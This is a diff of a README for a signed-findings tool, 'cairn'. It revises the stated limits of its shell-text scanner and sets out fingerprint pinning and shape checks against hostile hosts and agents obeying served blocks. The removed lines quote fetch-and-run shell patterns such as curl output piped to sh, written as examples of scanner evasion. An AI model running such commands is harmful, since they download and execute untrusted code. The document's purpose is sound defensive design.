@@ -210,16 +210,18 @@ merge can be exercised without network access. It is fabricated and labelled as 
 Stated here rather than discovered later.
 
 - **The executable scanner is a review aid, not a boundary.** Pattern matching on shell text
-  is trivially evadable: five of eight hand-written evasions pass it (`curl x > /tmp/a && sh
-  /tmp/a`, `bash <(curl x)`, `python -c 'exec(urlopen(...).read())'`). What defends the corpus
-  is that every finding arrives by pull request and a person merges it. Treating the scanner
-  as though it were a boundary is the more dangerous error.
+  is trivially evadable: five of eight hand-written evasions pass it. Rather than pretend
+  otherwise, **nothing is auto-executed** — `cairn:verify` prints the command and requires
+  `--run`. Carelessness is caught by the scanner, malice by pull-request review, and neither
+  has to be perfect because nothing runs on its own.
 - **Redaction catches mechanical leaks only.** Credentials, addresses, paths, blobs. It cannot
   tell that a stack frame quotes proprietary source or that a directory names a customer.
-- **Key distribution is unsolved.** `cairn:install --key` requires the public key to already be
-  in `keys/`, and "obtain it out of band" has no channel yet. Taking the fingerprint from the
-  same host you are verifying is circular. A key published in the git repo, a package, or DNS
-  would fix it; none of that exists.
+- **Key distribution needs one honest channel.** Solved structurally: the host serves the
+  public key, and you pin its **full sha256 fingerprint**, so a substituted key is detected —
+  the same construction as an SSH host key fingerprint. Pins shorter than 128 bits are
+  refused. What remains is publishing the fingerprint somewhere the host does not control
+  (this README, a package, a talk); taking it from the host you are verifying is circular and
+  the tool cannot stop you doing that.
 - **Signed installs need `CAIRN_SIGNING_KEY` set** in the deployment environment. Without it
   the endpoint serves the block unsigned and says so, and a client that pinned a key refuses —
   it fails closed, but the feature is inoperative until the key is provisioned.
@@ -315,10 +317,17 @@ is **not** "never fetch". The danger was obeying, not fetching. `/api/block` ser
 **signed**, you pin a key obtained out of band, and a swapped or compromised host fails closed
 instead of executing. That is the same trust model as any pinned dependency.
 
-Because a stolen key still signs perfectly, the content is validated independently: nothing
-executable, no host but the one you are adopting. Verified against a hostile server — a
-tampered block fails the signature; a correctly signed hostile block is still refused by the
-shape check.
+Three independent gates, tested against a hostile server:
+
+| attack | caught by |
+|---|---|
+| block altered in transit | signature fails |
+| hostile host serving **its own key**, perfect signature, lying about the fingerprint | **pin check** — the fetched key hashes to something else |
+| correctly signed hostile block (stolen key) | shape check — pipe-to-shell, foreign host |
+| pin shorter than 128 bits | refused before anything is fetched |
+
+The pin is what closes the circularity: the host may serve the key, it cannot substitute one,
+because the fingerprint reached you through a channel it does not control.
 
 ### What the block asks of an agent
 
